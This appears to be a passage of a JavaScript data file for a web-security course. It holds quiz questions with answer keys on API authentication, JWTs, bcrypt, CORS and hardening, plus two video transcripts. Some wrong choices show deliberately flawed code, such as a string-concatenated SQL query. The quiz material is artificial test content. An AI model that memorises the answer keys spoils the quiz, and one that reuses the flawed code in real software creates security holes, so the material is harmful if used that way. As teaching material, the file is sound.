    example: 'A quick self-audit of a Tasks API: log in as Ana and request Ben\'s task (expect **403**); send a task with `userId` of someone else (expect your own id stored); send `?limit=-1` and `?limit=999999` (expect 1 and 100 items at most); search the repository for `JWT_SECRET =` (expect only `process.env`); trigger an error (expect no stack trace in the response).',
    mistake: '"Security is something we add at the end." Some layers (helmet, rate limits) can be added at the edges, but the important decisions shape the code from day one: whether the owner comes from the token, whether passwords are hashed, whether errors leak details. Retrofitting them after users and data exist is far harder.' },
];

DATA.en.AUTH_QUIZ = [
  /* Authentication and authorisation */
  { type: 'mc', topic: 'identity',
    q: 'Ben sends `DELETE /tasks/12` with a valid, unexpired token. Task 12 exists and belongs to Ana. What should the API answer?',
    choices: ['200, because the token is valid', '401, because Ben is not authorised', '403, because Ben is authenticated but it is not his task', '404, to hide that the task exists'],
    answer: 2,
    why: 'The token proves **who** Ben is (authentication passed), so not 401. The ownership check fails, which is an authorisation failure: **403**. (Some APIs answer 404 to hide existence; 403 is the plain, honest answer.)' },
  { type: 'mc', topic: 'access',
    q: 'A request reaches `GET /tasks` with no `Authorization` header at all. Which part of a typical Express API answers, and with what?',
    choices: ['The tasks controller, with 403', 'The auth middleware, with 401, before any tasks handler runs', 'The Zod validator, with 400', 'Express itself, with 404'],
    answer: 1,
    why: '`app.use(\'/tasks\', auth, tasksRouter)` puts `auth` first; with no token it answers **401** `Missing token` and never calls `next()`.' },
  { type: 'tf', topic: 'access',
    q: 'If the auth middleware accepted the token, the caller may read or change any resource whose id they put in the URL.',
    answer: false,
    why: 'A valid token says who you are, not what you own. Every controller action must still compare `req.user.sub` with the resource\'s owner (broken access control otherwise).' },
  { type: 'mc', topic: 'access',
    q: 'When creating a task, where must the server take the owner\'s id from?',
    choices: ['`req.body.userId`', '`req.query.userId`', '`req.user.sub`, set by the auth middleware from the verified token', 'A hidden form field'],
    answer: 2,
    why: 'Everything in the body, query or form is controlled by the client. Only the verified token is trustworthy, so the owner is `req.user.sub`.' },
  { type: 'fib', topic: 'access',
    q: 'A safe ownership check compares owners with `Number(task.user_id) !== Number(req.user.___)`.',
    accept: ['sub'],
    why: '`sub` (subject) is the standard JWT claim for the user id; a typical log-in signs `{ sub: user.id, role: user.role }`.' },
  { type: 'mc', topic: 'access',
    q: 'Ana changes the URL from `/notes/8` to `/notes/9` and sees another user\'s note. What is this vulnerability called?',
    choices: ['Cross-site scripting', 'Broken access control (IDOR)', 'SQL injection', 'A CORS misconfiguration'],
    answer: 1,
    why: 'The server authenticated her but never checked ownership of note 9: **broken access control**, also called an insecure direct object reference (IDOR), number one in the OWASP Top 10.' },
  { type: 'tf', topic: 'identity',
    q: 'Authentication must happen before authorisation: you cannot decide what a caller may do before you know who they are.',
    answer: true,
    why: 'Authorisation decisions use the identity (`req.user`) that authentication produced, so the auth middleware runs first and the ownership or role checks come after it.' },
  { type: 'mc', topic: 'identity',
    q: 'In a football club API, a logged-in **member** tries `POST /fixtures`, which only admins may do. Which answer fits?',
    choices: ['401: log in again', '403: you are known, but your role does not allow this', '400: the body is invalid', '409: the fixture already exists'],
    answer: 1,
    why: 'The member is authenticated; the **role** check fails, which is an authorisation failure: **403**. Logging in again would not change the role.' },

  /* Password storage */
  { type: 'mc', topic: 'passwords',
    q: 'Why do APIs store a password **hash** rather than an **encrypted** password?',
    choices: ['Hashes are shorter, so they save disk space', 'Encryption can be reversed by anyone who gets the key, which lives on the same server; a hash cannot be reversed at all', 'Hashing is faster, so log-ins are quicker', 'Encrypted values cannot be stored in SQL'],
    answer: 1,
    why: 'The server never needs to read a password back, only to check one. A one-way hash leaves an attacker nothing to decrypt; an encrypted column falls with its key.' },
  { type: 'tf', topic: 'passwords',
    q: 'A salt must be kept secret, in a separate table or file, or it is useless.',
    answer: false,
    why: 'A salt is not a secret: its job is to be **different for every password** so equal passwords give different hashes and precomputed tables are useless. bcrypt stores it inside the hash string.' },
  { type: 'mc', topic: 'passwords',
    q: 'Hashing with bcrypt at cost 10 takes 60 ms on your server. Roughly how long does cost 12 take?',
    choices: ['62 ms', '72 ms', '120 ms', '240 ms'],
    answer: 3,
    why: 'The cost is an exponent (2^cost rounds): each +1 doubles the time. Two steps up is ×4: about 240 ms, and four times slower for an attacker too.' },
  { type: 'mc', topic: 'passwords',
    q: 'Two users register with the same password `123456`. With bcrypt, what does the users table contain?',
    choices: ['Two identical hashes', 'Two different hashes, because each was made with its own random salt', 'The password once and a pointer to it', 'An error: bcrypt refuses duplicate passwords'],
    answer: 1,
    why: '`bcrypt.hash` generates a new salt every time, so the stored strings differ and the attacker learns nothing from comparing rows.' },
  { type: 'fib', topic: 'passwords',
    q: 'At log-in the server checks the password with `await bcrypt.___(password, user.password_hash)`.',
    accept: ['compare'],
    why: '`bcrypt.compare` re-hashes the attempt with the salt and cost stored in the hash and compares the results. Nothing is decrypted.' },
  { type: 'mc', topic: 'passwords',
    q: 'Why is a single SHA-256 a poor way to store passwords, even though SHA-256 is a secure hash?',
    choices: ['It produces hashes that can be decrypted', 'It is designed to be fast, so an attacker can test billions of guesses per second (and without a salt, equal passwords look equal)', 'Its output is too long for a database column', 'It only accepts passwords up to 8 characters'],
    answer: 1,
    why: 'Speed is good for checking files and terrible for passwords. bcrypt and argon2 are deliberately slow and salted; the hash-cost tool shows the difference in guesses per second.' },
  { type: 'mc', topic: 'tokens',
    q: 'A log-in arrives for an email that has no account. What should the API answer?',
    choices: ['404 `No user with that email`', '401 `Invalid credentials`, exactly as for a wrong password', '400 `Email not registered`', '200 with an empty token'],
    answer: 1,
    why: 'Using the same answer for both failures stops **account enumeration**: an attacker cannot learn which emails are registered.' },
  { type: 'tf', topic: 'passwords',
    q: '`bcrypt.compare` decrypts the stored hash to get the original password and then compares the two passwords.',
    answer: false,
    why: 'A hash cannot be decrypted. `compare` hashes the attempt again with the stored salt and cost and checks whether the two **hashes** match.' },
  { type: 'mc', topic: 'tokens',
    q: 'Which response body is right for a successful `POST /auth/register`?',
    choices: ['`{ "id": 7, "email": "ana@example.com", "password_hash": "$2b$10$…" }`', '`{ "id": 7, "email": "ana@example.com" }`', '`{ "id": 7, "email": "ana@example.com", "password": "password1" }`', '`{ "ok": true }` with status 200'],
    answer: 1,
    why: 'Answer **201** `{ id, email }` only: never the hash and certainly never the password.' },

  /* Sessions and tokens */
  { type: 'mc', topic: 'tokens',
    q: 'What are the three dot-separated parts of a JWT, in order?',
    choices: ['payload.header.signature', 'header.payload.signature', 'header.signature.payload', 'id.secret.expiry'],
    answer: 1,
    why: '`header.payload.signature`: the algorithm, the claims, and the HMAC of the first two.' },
  { type: 'tf', topic: 'tokens',
    q: 'The payload of a JWT is encrypted, so only the server can read it.',
    answer: false,
    why: 'It is only base64url-**encoded**: anyone can decode it (the JWT inspector does it with no secret). The signature protects integrity, not confidentiality.' },
  { type: 'mc', topic: 'tokens',
    q: 'A user decodes their token, changes `"role":"user"` to `"role":"admin"`, re-encodes it and sends it. What happens in an API that uses `jwt.verify`?',
    choices: ['They become admin, because the payload says so', '`jwt.verify` recomputes the signature, it no longer matches, and the middleware answers 401', 'The server re-signs the token automatically', 'The request succeeds but `req.user` is `undefined`'],
    answer: 1,
    why: 'Without the secret they cannot produce the signature for the new payload, so verification fails with `invalid signature` → **401**.' },
  { type: 'fib', topic: 'tokens',
    q: 'Complete the header: `Authorization: ___ eyJhbGciOiJIUzI1NiIs…`',
    accept: ['Bearer'],
    why: '"Bearer" means whoever holds the token is treated as its owner. A typical auth middleware requires the value to start with `Bearer `.' },
  { type: 'mc', topic: 'tokens',
    q: 'A developer writes `jwt.sign({ sub: 1, exp: Date.now() + 3600 }, secret)` meaning "expires in one hour". What really happens?',
    choices: ['It expires in one hour', 'It expires immediately', 'It practically never expires, because `exp` is in seconds and `Date.now()` is in milliseconds', 'jwt.sign throws an error'],
    answer: 2,
    why: 'JWT times are Unix **seconds**; a millisecond value lies tens of thousands of years in the future. Use `{ expiresIn: \'1h\' }` instead.' },
  { type: 'mc', topic: 'identity',
    q: 'Which is a real advantage of server-side sessions over JWTs?',
    choices: ['They need no storage on the server', 'A session can be revoked immediately by deleting its row', 'They work without cookies or headers', 'They are smaller to verify because no lookup is needed'],
    answer: 1,
    why: 'Sessions are stateful: deleting the row logs the user out at once. A JWT stays valid until `exp` unless you add a denylist.' },
  { type: 'mc', topic: 'tokens',
    q: 'What does the `HttpOnly` flag on a cookie do?',
    choices: ['Sends the cookie only over plain HTTP', 'Prevents JavaScript on the page from reading the cookie', 'Stops the browser from sending the cookie to other sites', 'Makes the cookie expire when the tab closes'],
    answer: 1,
    why: 'HttpOnly hides the cookie from `document.cookie`, so an injected script cannot steal it. `Secure` is the HTTPS-only flag and `SameSite` controls cross-site sending.' },
  { type: 'tf', topic: 'tokens',
    q: 'A token whose header says `"alg": "none"` must be rejected by the server.',
    answer: true,
    why: '"none" means unsigned: anyone could have written it. jsonwebtoken refuses it when given a secret, and `{ algorithms: [\'HS256\'] }` makes the rule explicit.' },
  { type: 'mc', topic: 'tokens',
    q: 'Why is `jwt.decode(token)` the wrong function for an auth middleware?',
    choices: ['It is slower than `jwt.verify`', 'It reads the payload without checking the signature or the expiry, so forged tokens would pass', 'It only works with RS256', 'It deletes the token after reading it'],
    answer: 1,
    why: '`decode` is for reading a token you already trust. The middleware must call `jwt.verify(token, secret)`, which checks the signature, the algorithm and `exp`.' },

  /* CORS */
  { type: 'mc', topic: 'cors',
    q: 'Which URL has the **same origin** as `http://localhost:3000/api/tasks`?',
    choices: ['`http://localhost:5173/`', '`http://127.0.0.1:3000/`', '`http://localhost:3000/login.html`', '`https://localhost:3000/api/tasks`'],
    answer: 2,
    why: 'Origin = scheme + host + port; the path does not count. The others differ in port, host (127.0.0.1 is another name) and scheme.' },
  { type: 'mc', topic: 'cors',
    q: '`curl http://localhost:3000/api/tasks` prints the tasks, but the same call from the React page on port 5173 fails. What is the most likely reason?',
    choices: ['The API is down', 'The browser enforces CORS and the API sends no `Access-Control-Allow-Origin` header; curl never checks CORS', 'curl adds a token automatically', 'React cannot call APIs on localhost'],
    answer: 1,
    why: 'Only browsers apply the same-origin policy. The API answered both requests; the browser refused to give the answer to the page.' },
  { type: 'mc', topic: 'cors',
    q: 'Which cross-origin `fetch` is sent **without** a preflight?',
    choices: ['`PUT` with a JSON body', '`GET` with `Authorization: Bearer …`', '`POST` with `Content-Type: application/x-www-form-urlencoded`', '`DELETE` with no headers'],
    answer: 2,
    why: 'A POST with one of the three form content types and no other special headers is a "simple" request. PUT/DELETE, JSON bodies and Authorization all need a preflight.' },
  { type: 'tf', topic: 'cors',
    q: 'Restricting CORS to your front-end origin stops other people from calling your API.',
    answer: false,
    why: 'CORS only limits what web pages can read inside a browser. curl, Postman and scripts ignore it. Protection comes from authentication and authorisation.' },
  { type: 'fib', topic: 'cors',
    q: 'The browser sends a preflight using the HTTP method ___.',
    accept: ['OPTIONS'],
    why: 'The preflight is `OPTIONS` with `Origin`, `Access-Control-Request-Method` and `Access-Control-Request-Headers`; the `cors` middleware answers it with 204.' },
  { type: 'mc', topic: 'cors',
    q: 'The server uses `cors({ origin: \'*\', credentials: true })` and the page calls `fetch(url, { credentials: \'include\' })`. What happens?',
    choices: ['It works: `*` allows everybody', 'The browser blocks it: with credentials the allowed origin must be the exact page origin, not `*`', 'The server refuses to start', 'The cookie is sent but the response has no body'],
    answer: 1,
    why: 'The spec forbids the wildcard for credentialed requests. Use `origin: \'http://localhost:5173\'` with `credentials: true`.' },
  { type: 'mc', topic: 'cors',
    q: 'A page on another site makes a simple cross-origin `POST /api/tasks` to your API, which has no CORS configuration. What is true?',
    choices: ['The request never reaches your server', 'Your server receives and runs it; the browser only stops the page from reading the response', 'The browser converts it into a GET', 'Express rejects it with 403 automatically'],
    answer: 1,
    why: 'Simple requests are sent first and checked afterwards. That is why state-changing routes must be protected on the server (auth), not by CORS.' },
  { type: 'mc', topic: 'cors',
    q: 'Chrome says: "Request header field authorization is not allowed by Access-Control-Allow-Headers in preflight response." The server has `allowedHeaders: [\'Content-Type\']`. What is the fix?',
    choices: ['Remove the `Authorization` header from every request', 'Add `\'Authorization\'` to `allowedHeaders` (or leave `allowedHeaders` unset so cors echoes the requested headers)', 'Add `Access-Control-Allow-Headers` to the fetch request', 'Switch the method to GET'],
    answer: 1,
    why: 'The preflight asked to send `authorization` and the answer did not list it. The server must allow it; the front end cannot grant itself permission.' },

  /* Hardening the API */
  { type: 'mc', topic: 'hardening',
    q: 'A `validate` middleware calls `taskSchema.safeParse(req.body)` and gets `success: false`. What should it do?',
    choices: ['Throws, so the error handler answers 500', 'Answers 400 with `error.issues` and does not call the controller', 'Calls `next()` and lets the model reject it', 'Answers 201 with the corrected data'],
    answer: 1,
    why: '`safeParse` never throws; the middleware turns a failure into **400** with the list of issues, so malformed bodies never reach the controller.' },
  { type: 'tf', topic: 'hardening',
    q: 'If the front-end form already validates every field, the API does not need to validate `req.body` again.',
    answer: false,
    why: 'Anyone can bypass your form with curl or a script. Front-end checks are a convenience; the server must validate everything that arrives.' },
  { type: 'mc', topic: 'hardening',
    q: 'A client sends `{"title":"Buy milk","userId":99}` to a `POST /tasks` protected by a Zod `validate` middleware (title required, `done` defaults to false). What is in `req.body` after the middleware?',
    choices: ['`{ title: \'Buy milk\', userId: 99 }`', '`{ title: \'Buy milk\', done: false }`: unknown keys stripped, default applied', 'Nothing: the request is rejected with 400 because of `userId`', '`{ userId: 99 }`'],
    answer: 1,
    why: 'Zod object schemas strip unknown keys by default and apply `.default(false)`, and `validate` replaces `req.body` with the parsed data. The owner then comes from the token.' },
  { type: 'mc', topic: 'hardening',
    q: 'An API clamps `page ≥ 1` and `1 ≤ limit ≤ 100`. What does `GET /tasks?page=0&limit=999` use?',
    choices: ['page 0, limit 999', 'page 1, limit 100', 'page 1, limit 20', 'It answers 400'],
    answer: 1,
    why: 'Clamping to `page ≥ 1` and `1 ≤ limit ≤ 100` means `page=0` becomes 1 and `limit=999` becomes 100.' },
  { type: 'mc', topic: 'hardening',
    q: 'A tutorial computes `const limit = Math.min(100, Number(req.query.limit) || 20);`. What is `limit` for `?limit=-5`?',
    choices: ['20', '1', '-5', '100'],
    answer: 2,
    why: '`Number(\'-5\')` is `-5`, which is truthy, and `Math.min(100, -5)` is `-5`. There is no lower bound; add `Math.max(1, …)`.' },
  { type: 'fib', topic: 'hardening',
    q: 'When a client exceeds express-rate-limit\'s limit, the API answers with status code ___ (Too Many Requests).',
    accept: ['429'],
    why: '429 Too Many Requests. A strict limiter on `/auth/login` makes password guessing impractical.' },
  { type: 'mc', topic: 'hardening',
    q: 'Your `JWT_SECRET` was committed to a public repository last week. What is the right response?',
    choices: ['Delete the line in a new commit; the problem is solved', 'Make the repository private; nothing else is needed', 'Generate a new secret, set it in the environment and remove it from the code: every old token stops working', 'Nothing: the secret is useless without the database'],
    answer: 2,
    why: 'Anyone with the secret can sign tokens for any user. Git history keeps the old value, so the only fix is **rotation**; users simply log in again.' },
  { type: 'mc', topic: 'hardening',
    q: 'Which code is safe against SQL injection?',
    choices: ['`db.query("SELECT * FROM users WHERE email = \'" + email + "\'")`', 'A template literal that inserts `${email}` into the SQL text', '`db.query(\'SELECT * FROM users WHERE email = $1\', [email])`', '`db.query(\'SELECT * FROM users WHERE email = \' + escape(email))`'],
    answer: 2,
    why: 'A parameterised query sends the value separately from the SQL text, so it can never be run as SQL. Concatenation and template literals both build SQL from user input.' },
  { type: 'tf', topic: 'hardening',
    q: '`express.json()` already rejects bodies larger than 100 kB by default, so `express.json({ limit: \'100kb\' })` changes nothing.',
    answer: true,
    why: 'The body parser\'s default limit is 100kb (it answers 413 above it). Writing the limit makes it visible; the real mistake would be raising it carelessly.' },
  { type: 'mc', topic: 'hardening',
    q: 'What does `app.use(helmet())` add to an Express API?',
    choices: ['Password hashing for every route', 'Protective HTTP response headers (nosniff, CSP, HSTS, frame options) and removal of `X-Powered-By`', 'An ownership check for every resource', 'Automatic input validation'],
    answer: 1,
    why: 'helmet only sets headers. It is useful, but it does nothing for access control, validation or secrets.' },
];

// <topic-videos> generated by video/embed.mjs: do not edit by hand
DATA.en.AUTH_VIDEOS = [
  {
    "id": "auth-login",
    "group": "tokens",
    "title": "Logging in: sessions and tokens",
    "mp4": "assets/video/auth-login/auth-login.mp4",
    "poster": "assets/video/auth-login/auth-login-poster.jpg",
    "captions": "assets/video/auth-login/auth-login.vtt",
    "duration": "3:18",
    "transcript": [
      "Logging in: the password is checked once. Then something else must vouch for you.",
      "An API asks two questions, always in this order. Who is calling? That's authentication. And may they do this? That's authorisation.",
      "Ana registers with ana@example.com and password 1. The API stores a hash, never the password. 201 Created. Hashing is one-way, and bcrypt adds a random salt, so two equal passwords still look completely different. Registering again with the same email? 409 Conflict.",
      "Now she logs in. The API fetches her row, hashes the attempt, and compares it with the stored hash. Wrong password: 401, Invalid credentials. An unknown email gets the very same answer, so nobody can discover who has an account. Right password: 200, and a token.",
      "But HTTP forgets. The next request knows nothing about her. So something must travel with every request. Option one: a cloakroom. The server keeps your coat and hands you a numbered ticket. That's a session id, in a cookie. The ticket means nothing on its own. The meaning lives in the server's list. Every request, the server looks the ticket up. Log out, and it throws the row away. Instantly.",
      "Option two: a signed wristband. Everything is written on the band: who you are, your role, when it expires. 1 hour, here. The band has three parts, joined by dots: header, payload, signature. The first two are only encoded, not hidden. The server seals it with its secret signature. Then it keeps nothing. It only checks the seal.",
      "Now someone rewrites the band: role: admin. The seal no longer matches. verify() throws invalid signature, and the answer is 401. Anyone can read the band. Only the server can seal it. That is why you never put secrets in a token, and why you always verify, never just decode.",
      "The price: a copied band works until it expires. A cloakroom ticket can be cancelled at once. A band needs no lookup, though, and works across many servers. Neither is simply better.",
      "With a token, the client sends it on every request, in the Authorization header, after the word Bearer. A gate in front of the routes checks it. Valid, and the route runs. Missing or forged, 401. After the hour is up, the same gate answers 401: jwt expired. Ana logs in again.",
      "Practise it with the JWT inspector in Authentication and security."
    ]
  },
  {
    "id": "cors-preflight",
    "group": "cors",
    "title": "CORS and the preflight",
    "mp4": "assets/video/cors-preflight/cors-preflight.mp4",
    "poster": "assets/video/cors-preflight/cors-preflight-poster.jpg",
    "captions": "assets/video/cors-preflight/cors-preflight.vtt",
    "duration": "3:08",
    "transcript": [
      "CORS and the preflight: why the browser, not your server, decides who may read an answer.",
      "Your front end runs on localhost, port 5173. Your API runs on localhost, port 3000. Same machine, different origins. An origin is scheme, host and port. Change any one, and it's another origin. A page's JavaScript may freely read answers only from its own origin. That's the same-origin policy.",
      "So the page sends a plain GET to the API. It goes out. The server receives it, runs the route, and answers. Your Express terminal even logs the GET. The request arrived. But the answer stops at the browser. The page can't read it, unless the server allows it.",
      "Every answer can carry a permission slip: Access-Control-Allow-Origin. If it names the page's origin, the browser hands the answer over. If it's missing, or names someone else, the page gets a CORS error. In Express, that's one line: app.use(cors({ origin })), with the origin of your front end.",
      "Now the page deletes task 7, with a token in the Authorization header. That's not a simple request. So first, the browser phones ahead: an OPTIONS request called the preflight. It asks: may this origin use DELETE, with an Authorization header? Only if the answer says yes does the real request cross.",
      "But the server allows only GET and POST. The browser blocks the call. Chrome's console says: Method DELETE is not allowed by Access-Control-Allow-Methods in preflight response. The DELETE was never sent. Task 7 is still there.",
      "Add DELETE to methods. The preflight passes. The real DELETE crosses, and the server answers 204. In the Network tab you'll see two rows: OPTIONS first, then DELETE. And mount cors first. A preflight carries no token, so auth would answer 401, and the preflight would fail.",
      "Notice who did the blocking. The browser, not the server. curl and Postman never ask permission, so they never see a CORS error. CORS doesn't protect your API either. Anyone outside a browser can still call it. Authentication does that.",
      "One more case: cookies. The page asks with credentials: include, and the server must name the exact origin, never a star (*), and allow credentials. A Bearer token in a header needs none of this.",
      "Practise it with the CORS simulator in Authentication and security."
    ]
  }
];
// </topic-videos>
